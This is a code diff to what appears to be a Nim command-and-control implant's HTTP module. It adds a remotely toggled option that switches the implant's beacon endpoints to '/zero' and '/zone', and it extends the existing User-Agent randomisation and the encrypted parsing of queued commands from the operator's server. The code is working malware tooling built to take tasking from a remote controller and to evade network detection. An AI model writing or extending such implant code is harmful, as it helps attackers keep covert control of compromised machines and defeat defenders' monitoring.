@@ -27,11 +27,12 @@ type
         cryptKey* : string
         randomUserAgents: bool
         randomUserAgentsCounter: int
+        changeEndPoints: bool
 
 
-
-# we can define whether we want to use the randomized userAgents
-# initally its false, unless we specify otherwise in the complie command 
+proc changeEndPointsStrategy(li :var Listener): void = 
+    li.taskPath = "/zero"
+    li.resultPath = "/zone"
 
 # define a function to pick random userAgents with each command
 proc getRandomUserAgent(li :var Listener): string =
@@ -58,6 +59,8 @@ proc getRandomUserAgent(li :var Listener): string =
 # HTTP request function
 proc doRequest(li : var Listener, path : string, postKey : string = "", postValue : string = "") : Response =
     try:
+        if li.changeEndPoints:
+            changeEndPointsStrategy(li)
         # increase the requests counter
         li.randomUserAgentsCounter += 1 
         # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
@@ -77,7 +80,8 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
                 if li.randomUserAgents:
                     headers = @[
                             Header(key: "X-Identifier", value: li.id),
-                            Header(key: "User-Agent", value: getRandomUserAgent(li))
+                            Header(key: "User-Agent", value: getRandomUserAgent(li)),
+                            Header(key: "s4", value: $li.changeEndPoints)
                         ]
                 else:
                     headers = @[
@@ -155,6 +159,7 @@ proc init*(li: var Listener) : void =
         li.initialized = true
         li.randomUserAgents = false
         li.randomUserAgentsCounter = 0
+        li.changeEndPoints = false
     else:
         li.initialized = false
 
@@ -202,6 +207,7 @@ proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
         try:
             # check for userAgent status
             li.randomUserAgents = parseBool(decryptData(parseJson(res.body)["s2"].getStr(), li.cryptKey).replace("\'", "\""))
+            li.changeEndPoints = parseBool(decryptData(parseJson(res.body)["s4"].getStr(), li.cryptKey).replace("\'", "\""))
 
             # Attempt to parse task (parseJson() needs string literal... sigh)
             var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\"")
